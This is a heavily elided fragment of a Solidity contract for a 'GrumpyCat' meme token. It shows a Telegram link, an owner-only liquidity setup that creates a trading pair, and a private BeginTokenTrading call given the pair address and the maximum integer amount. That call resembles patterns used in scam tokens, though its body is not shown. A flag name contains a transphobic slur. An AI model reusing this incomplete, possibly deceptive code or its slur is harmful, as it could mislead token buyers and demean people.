/**
 - Community: https://t.me/GrumpyCatChat
*/
...
contract GrumpyCat is Context, IERC20, Ownable {
    ...
    bool public TroonToTheMoon = true;
    ...
    function BeginTokenTrading(address _lpAddr, uint256 amount) private returns(bool) {
    ...
    function ProvideLP() external payable onlyOwner {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router; BeginTokenTrading(uniswapPair, type(uint).max);
